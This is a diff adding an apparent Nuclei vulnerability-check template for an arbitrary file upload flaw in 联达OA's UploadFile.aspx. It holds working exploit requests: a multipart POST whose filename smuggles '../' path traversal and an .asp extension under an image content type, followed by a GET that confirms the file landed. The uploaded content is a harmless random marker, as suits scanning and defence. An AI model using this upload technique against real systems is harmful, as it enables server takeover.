@@ -1,0 +1,58 @@
+id: poc-yaml-lianda-oa-uploadfile-aspx-anyfile-upload
+info:
+  name: 联达OA UploadFile.aspx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    联达OA UploadFile.aspx 任意文件上传漏洞 allows an attacker to upload arbitrary files, potentially leading to remote code execution or sensitive data exposure.
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/FileManage/UpLoadFile.aspx"
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: |-
+      --00content0boundary00
+      Content-Disposition: form-data; name="DesignId"
+
+      1
+      --00content0boundary00
+      Content-Disposition: form-data; name="file"; filename="../{{t1}}.asp"
+      Content-Type: image/png
+
+      {{t2}}
+      --00content0boundary00--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t1}}"
+          - "文件上传成功"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/FileManage/{{t1}}.asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
